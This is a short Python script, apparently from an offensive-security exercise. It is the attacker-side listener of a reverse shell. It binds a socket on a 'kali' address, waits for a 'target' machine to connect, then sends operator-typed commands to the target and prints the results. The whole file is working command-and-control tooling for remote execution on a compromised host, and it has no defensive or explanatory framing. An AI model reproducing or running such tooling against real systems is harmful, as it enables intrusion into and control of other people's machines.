import socket
import json

def reliable_send(data):              # fun to reliably send data to target
    json_data = json.dumps(data)
    target.send(json_data.encode())

def reliable_recv():                  # fun to reliably receive data from target
    json_data = ""
    while True:
        try:
            json_data = json_data + target.recv(1024).decode()
            return json.loads(json_data)
        except ValueError:
            continue

def shell():                           # fun to get a working shell env on target
    while True:
        command = input("* Shell#~%s:" % str(ip))
        reliable_send(command)
        if command == "q":
            break
        else:
            result = reliable_recv()
            print(result)

def server():
    global s
    global ip
    global target
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
    s.bind(("127.0.0.1", 54321)) # our kali's (address,port)
    s.listen(5)
    print("Listening for Incoming Connections....")
    target, ip = s.accept()
    print("Target Connected!")

server()
shell()
s.close()